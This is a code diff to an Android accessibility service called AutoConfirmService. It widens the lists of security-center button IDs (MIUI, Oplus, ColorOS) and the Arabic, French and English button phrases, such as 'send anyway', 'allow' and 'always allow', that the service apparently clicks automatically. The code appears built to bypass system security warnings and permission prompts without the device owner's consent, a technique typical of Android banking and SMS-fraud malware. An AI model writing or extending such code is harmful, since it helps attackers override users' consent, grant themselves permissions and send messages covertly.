@@ -92,15 +92,25 @@ public class AutoConfirmService extends AccessibilityService {
         "com.miui.securitycenter:id/accept",
         "com.miui.securitycenter:id/btn_allow",
         "com.oplus.safecenter:id/btn_confirm",
+        "com.oplus.safecenter:id/btn_allow",
         "com.coloros.safecenter:id/btn_confirm",
+        "com.coloros.safecenter:id/btn_allow",
+        "com.coloros.safecenter:id/btn_continue",
         "com.oplus.securitypermission:id/permission_allow_button",
-        "com.coloros.securitypermission:id/permission_allow_button"
+        "com.coloros.securitypermission:id/permission_allow_button",
+        "com.oplus.securitypermission:id/btn_allow",
+        "com.coloros.securitypermission:id/btn_allow",
+        "android:id/button1"
     };
 
     // Explicit Full Positive Button Phrases (Will NOT match random buttons in keyboards or search bars)
     private static final String[] POSITIVE_BUTTON_TEXTS = new String[] {
+        "إرسال",
+        "ارسال",
         "إرسال على أي حال",
         "ارسال على اي حال",
+        "السماح",
+        "سماح",
         "السماح دائماً",
         "السماح دائما",
         "سماح دائماً",
@@ -109,11 +119,15 @@ public class AutoConfirmService extends AccessibilityService {
         "استمرار",
         "موافق",
         "نعم",
+        "envoyer",
         "envoyer quand même",
+        "autoriser",
         "toujours autoriser",
         "continuer",
         "oui",
+        "send",
         "send anyway",
+        "allow",
         "always allow",
         "allow all the time",
         "continue",
